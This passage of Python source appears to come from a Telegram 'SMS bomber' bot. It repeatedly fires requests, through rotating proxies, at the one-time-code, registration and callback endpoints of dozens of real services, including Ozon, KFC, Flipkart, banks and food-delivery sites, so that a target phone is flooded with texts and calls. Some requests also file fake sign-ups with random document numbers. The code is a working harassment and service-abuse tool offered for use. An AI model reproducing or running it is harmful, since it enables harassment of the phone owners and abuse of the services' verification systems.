                requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",
                             headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
                             params={"phone": phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))},
                             proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.prosushi.ru/php/profile.php", data={"phone": "+" + phone, "mode": "sms"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+#-###-###-##-##")
                requests.post("https://api.pozichka.ua/v1/registration/send",
                              json={"RegisterSendForm": {"phone": phonee}}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://butovo.pizzapomodoro.ru/ajax/user/auth.php",
                              data={"AUTH_ACTION": "SEND_USER_CODE", "phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
                              data={"phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": phone}, proxies=proxies,
                             timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone9, maska="8-###-###-##-##")
                requests.post("https://pizzasushiwok.ru/index.php",
                              data={"mod_name": "call_me", "task": "request_call", "name": name, "phone": phonee},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://pizzasinizza.ru/api/phoneCode.php", json={"phone": phone9}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://pizzakazan.com/auth/ajax.php", data={"phone": "+" + phone, "method": "sendCode"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-####")
                requests.post("https://pizza46.ru/ajaxGet.php", data={"phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",
                              data={"telephone": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+#-###-###-##-##")
                requests.post("https://paylate.ru/registry",
                              data={"mobile": phonee, "first_name": name, "last_name": name, "nick_name": name,
                                    "gender-client": 1, "email": email, "action": "registry"}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode",
                              data={"telephone": "8" + phone9}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
                              json={"phone": phone, "otpId": 0}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-####")
                requests.post("https://www.osaka161.ru/local/tools/webstroy.webservice.php",
                              data={"name": "Auth.SendPassword", "params[0]": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://ontaxi.com.ua/api/v2/web/client", json={"country": "UA", "phone": phone[3:]},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://secure.online.ua/ajax/check_phone/", params={"reg_phone": phone}, proxies=proxies,
                             timeout=10)
            except:
                pass
            try:
                requests.post("https://www.ollis.ru/gql", json={
                    "query": "mutation { phone(number:\"" + phone + "\", locale:ru) { token error { code message } } }"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone9, maska="8 (###) ###-##-##")
                requests.get("https://okeansushi.ru/includes/contact.php",
                             params={"call_mail": "1", "ajax": "1", "name": name, "phone": phonee, "call_time": "1",
                                     "pravila2": "on"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                              data={"st.r.phone": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://nn-card.ru/api/1.0/covid/login", json={"phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://www.nl.ua", data={"component": "bxmaker.authuserphone.login",
                                                         "sessid": "bf70db951f54b837748f69b75a61deb4",
                                                         "method": "sendCode", "phone": phone, "registration": "N"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.niyama.ru/ajax/sendSMS.php",
                              data={"REGISTER[PERSONAL_PHONE]": phone, "code": "", "sendsms": "Выслать код"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://account.my.games/signup_send_sms/", data={"phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://auth.multiplex.ua/login", json={"login": phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
                              params={"msisdn": phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.moyo.ua/identity/registration",
                              data={"firstname": name, "phone": phone, "email": email}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://mos.pizza/bitrix/components/custom/callback/templates/.default/ajax.php",
                              data={"name": name, "phone": phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.monobank.com.ua/api/mobapplink/send", data={"phone": "+" + phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://moneyman.ru/registration_api/actions/send-confirmation-code", data={"+" + phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
                              json={"FirstName": name, "CellPhone": phone, "Package": "optimal"}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://mobileplanet.ua/register",
                              data={"klient_name": name, "klient_phone": "+" + phone, "klient_email": email},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ### ## ##")
                requests.get(f"http://mnogomenu.ru/office/password/reset/" + phonee, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://my.mistercash.ua/ru/send/sms/registration", params={"number": "+" + phone},
                             proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://menza-cafe.ru/system/call_me.php",
                             params={"fio": name, "phone": phone, "phone_number": "1"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.menu.ua/kiev/delivery/profile/show-verify.html",
                              data={"phone": phone, "do": "phone"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# ### ### ## ##")
                requests.get("https://makimaki.ru/system/callback.php", params={"cb_fio": name, "cb_phone": phonee},
                             proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php",
                              data={"data": phone, "metod": "postreg"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api-rest.logistictech.ru/api/v1.1/clients/request-code", json={"phone": phone},
                              headers={"Restaurant-chain": "c0ab3d88-fba8-47aa-b08d-c7598a3be0b9"}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://loany.com.ua/funct/ajax/registration/code", data={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://rubeacon.com/api/app/5ea871260046315837c8b6f3/middle",
                              json={"url": "/api/client/phone_verification", "method": "POST",
                                    "data": {"client_id": 5646981, "phone": phone, "alisa_id": 1},
                                    "headers": {"Client-Id": 5646981,
                                                "Content-Type": "application/x-www-form-urlencoded"}}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://lenta.com/api/v1/authentication/requestValidationCode",
                              json={"phone": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://koronapay.com/transfers/online/api/users/otps", data={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.kinoland.com.ua/api/v1/service/send-sms", headers={"Agent": "website"},
                              json={"Phone": phone, "Type": 1}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="# (###) ###-##-##")
                requests.post("https://kilovkusa.ru/ajax.php",
                              params={"block": "auth", "action": "send_register_sms_code", "data_type": "json"},
                              data={"phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",
                              json={"phone": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://kaspi.kz/util/send-app-link", data={"address": phone9}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://app.karusel.ru/api/v1/phone/", data={"phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://izi.ua/api/auth/register",
                              json={"phone": "+" + phone, "name": name, "is_terms_accepted": True}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+## (###) ###-##-##")
                requests.post("https://iqlab.com.ua/session/ajaxregister", data={"cellphone": phonee}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2",
                              headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"},
                              json={"Birthday": "1986-07-10T07:19:56.276+02:00",
                                    "DocIssueDate": "2004-02-05T07:19:56.276+02:00",
                                    "DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),
                                    "FirstName": name, "Gender": "M", "LastName": name, "SecondName": name,
                                    "Phone": phone9, "Email": email}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://informatics.yandex/api/v1/registration/confirmation/phone/send/",
                              data={"country": "RU", "csrfmiddlewaretoken": "", "phone": phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                              data={"mode": "request", "phone": "+" + phone, "phone_permission": "unknown",
                                    "stream_id": 0, "v": 3, "appversion": "3.20.6", "osversion": "unknown",
                                    "devicemodel": "unknown"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.imgur.com/account/v1/phones/verify",
                              json={"phone_number": phone, "region_code": "RU"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",
                              data={"msisdn": phone, "locale": "en", "countryCode": "ru", "version": "1",
                                    "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://api.hmara.tv/stable/entrance", params={"contact": phone}, proxies=proxies,
                             timeout=10)
            except:
                pass
            try:
                requests.post("https://helsi.me/api/healthy/accounts/login",
                              json={"phone": phone, "platform": "PISWeb"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.hatimaki.ru/register/",
                              data={"REGISTER[LOGIN]": phone, "REGISTER[PERSONAL_PHONE]": phone,
                                    "REGISTER[SMS_CODE]": "", "resend-sms": "1", "REGISTER[EMAIL]": "",
                                    "register_submit_button": "Зарегистрироваться"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://guru.taxi/api/v1/driver/session/verify",
                              json={"phone": {"code": 1, "number": phone9}}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://crm.getmancar.com.ua/api/veryfyaccount",
                              json={"phone": "+" + phone, "grant_type": "password", "client_id": "gcarAppMob",
                                    "client_secret": "SomeRandomCharsAndNumbersMobile"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
                              data={"casePar": "authSendsms", "MobilePhone": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://foodband.ru/api?call=calls",
                              data={"customerName": name, "phone": phonee, "g-recaptcha-response": ""}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.get("https://foodband.ru/api/",
                             params={"call": "customers/sendVerificationCode", "phone": phone9,
                                     "g-recaptcha-response": ""}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.flipkart.com/api/5/user/otp/generate",
                              headers={"Origin": "https://www.flipkart.com",
                                       "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},
                              data={"loginId": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                print('ok')
                requests.post("https://www.flipkart.com/api/6/user/signup/status",
                              headers={"Origin": "https://www.flipkart.com",
                                       "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop"},
                              json={"loginId": "+" + phone, "supportAllStates": True}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://fix-price.ru/ajax/register_phone_code.php",
                              data={"register_call": "Y", "action": "getCode", "phone": "+" + phone}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.get("https://findclone.ru/register", params={"phone": "+" + phone}, proxies=proxies,
                             timeout=10)
            except:
                pass
            try:
                requests.post("https://www.finam.ru/api/smslocker/sendcode", data={"phone": "+" + phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://2407.smartomato.ru/account/session",
                              json={"phone": phonee, "g-recaptcha-response": None}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://www.etm.ru/cat/runprog.html",
                              data={"m_phone": phone9, "mode": "sendSms", "syf_prog": "clients-services",
                                    "getSysParam": "yes"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://api.eldorado.ua/v1/sign/",
                             params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null",
                                     "lang": "ru"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://vladimir.edostav.ru/site/CheckAuthLogin", data={"phone_or_email": "+" + phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.delitime.ru/api/v2/signup",
                              data={"SignupForm[username]": phone, "SignupForm[device_type]": 3}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://api.creditter.ru/confirm/sms/send", json={"phone": phonee, "type": "register"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://clients.cleversite.ru/callback/run.php",
                              data={"siteid": "62731", "num": phone, "title": "Онлайн-консультант",
                                    "referrer": "https://m.cleversite.ru/call"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": phone},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/", data={}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://cinema5.ru/api/phone_code", data={"phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.cian.ru/sms/v1/send-validation-code/",
                              json={"phone": "+" + phone, "type": "authenticateCode"}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api.carsmile.com/",
                              json={"operationName": "enterPhone", "variables": {"phone": phone},
                                    "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.get("https://it.buzzolls.ru:9995/api/v2/auth/register", params={"phoneNumber": "+" + phone, },
                             headers={"keywordapi": "ProjectVApiKeyword", "usedapiversion": "3"}, proxies=proxies,
                             timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone9, maska="(###)###-##-##")
                requests.post("https://bluefin.moscow/auth/register/", data={"phone": phonee, "sendphone": "Далее"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://app.benzuber.ru/login", data={"phone": "+" + phone}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://bartokyo.ru/ajax/login.php", data={"user_phone": phonee}, proxies=proxies,
                              timeout=10)
            except:
                pass
            try:
                requests.post("https://bamper.by/registration/?step=1",
                              data={"phone": "+" + phone, "submit": "Запросить смс подтверждения", "rules": "on"},
                              proxies=proxies, timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone9, maska="(###) ###-##-##")
                requests.get("https://avtobzvon.ru/request/makeTestCall", params={"to": phonee}, proxies=proxies,
                             timeout=10)
            except:
                pass
            try:
                phonee = mask(str=phone, maska="+# (###) ###-##-##")
                requests.post("https://oauth.av.ru/check-phone", json={"phone": phonee}, proxies=proxies, timeout=10)
            except:
                pass
            try:
                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",
                              data={"phone": phone}, proxies=proxies, timeout=10)
            except:
                pass
        except:
            pass

    def main():
        global res
        now = datetime.datetime.now()
        date1 = datetime.datetime.combine(datetime.date(now.year, now.month, now.day),
                                          datetime.time(now.hour, now.minute))
        unixtime = date1.timestamp()
        for user in active_bomber.copy():
            for phone in active_bomber[user].copy():
                unixtime5 = active_bomber[user][phone]['unixtime']
                if unixtime < unixtime5:
                    return
                # proxy1 = res[randint(0, len(res) - 1)]
                if active_bomber[user][phone]['cycle'] == 0:
                    del active_bomber[user][phone]
                    bot.send_message(user, f'Бомбер на номер "{phone}" закончил свои циклы')
                else:
                    active_bomber[user][phone]['cycle'] -= 1
                    threading.Thread(target=thread_send_msg, args=(phone,)).start()

    interval1 = setInterval(main, 10)
    interval2 = setInterval(update_proxy, 120)

class AlreadyRunning(Exception):
    pass


class IntervalNotValid(Exception):
    pass


class setInterval():
    def __init__(this, func=None, sec=None, args=[]):
        this.running = False
        this.func = func  # the function to be run
        this.sec = sec  # interval in second
        this.Return = None  # The returned data
        this.args = args
        this.runOnce = None  # asociated with run_once() method
        this.runOnceArgs = None  # asociated with run_once() method

        if (func is not None and sec is not None):
            this.running = True

            if (not callable(func)):
                raise TypeError("non-callable object is given")

            if (not isinstance(sec, int) and not isinstance(sec, float)):
                raise TypeError("A non-numeric object is given")

            this.TIMER = threading.Timer(this.sec, this.loop)
            this.TIMER.start()

    def start(this):
        if (not this.running):
            if (not this.isValid()):
                raise IntervalNotValid("The function and/or the " +
                                       "interval hasn't provided or invalid.")
            this.running = True
            this.TIMER = threading.Timer(this.sec, this.loop)
            this.TIMER.start()
        else:
            raise AlreadyRunning("Tried to run an already run interval")

    def stop(this):
        this.running = False

    def isValid(this):
        if (not callable(this.func)):
            return False

        cond1 = not isinstance(this.sec, int)
        cond2 = not isinstance(this.sec, float)
        if (cond1 and cond2):
            return False
        return True

    def loop(this):

        if (this.running):
            this.TIMER = threading.Timer(this.sec, this.loop)
            this.TIMER.start()
            function_, Args_ = this.func, this.args

            if (this.runOnce is not None):  # someone has provide the run_once
                runOnce, this.runOnce = this.runOnce, None
                result = runOnce(*(this.runOnceArgs))
                this.runOnceArgs = None

                # if and only if the result is False. not accept "None"
                # nor zero.
                if (result is False):
                    return  # cancel the interval right now

            this.Return = function_(*Args_)

    def change_interval(this, sec):

        cond1 = not isinstance(sec, int)
        cond2 = not isinstance(sec, float)
        if (cond1 and cond2):
            raise TypeError("A non-numeric object is given")

        # prevent error when providing interval to a blueprint
        if (this.running):
            this.TIMER.cancel()

        this.sec = sec

        # prevent error when providing interval to a blueprint
        # if the function hasn't provided yet
        if (this.running):
            this.TIMER = threading.Timer(this.sec, this.loop)
            this.TIMER.start()

    def change_next_interval(this, sec):

        if (not isinstance(sec, int) and not isinstance(sec, float)):
            raise TypeError("A non-numeric object is given")

        this.sec = sec

    def change_func(this, func, args=[]):

        if (not callable(func)):
            raise TypeError("non-callable object is given")

        this.func = func
        this.args = args

    def run_once(this, func, args=[]):
        this.runOnce = func
        this.runOnceArgs = args

    def get_return(this):
        return this.Return


    def send_reklam_text(chat_id):
        conn = sqlite3.connect('base.db')
        cursor = conn.cursor()
        row = cursor.execute(f'SELECT * FROM context WHERE id = "1"').fetchall()
        cursor.close()
        if row[0][2] is None:
            return
        if row[0][3] is None:
            return bot.send_message(chat_id=chat_id, text=row[0][2], reply_markup=menu.delete_message(),
                                    parse_mode='HTML')
        return bot.send_photo(chat_id=chat_id, photo=row[0][3], caption=row[0][2], reply_markup=menu.delete_message(),
                              parse_mode='HTML')



    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)


start_bot()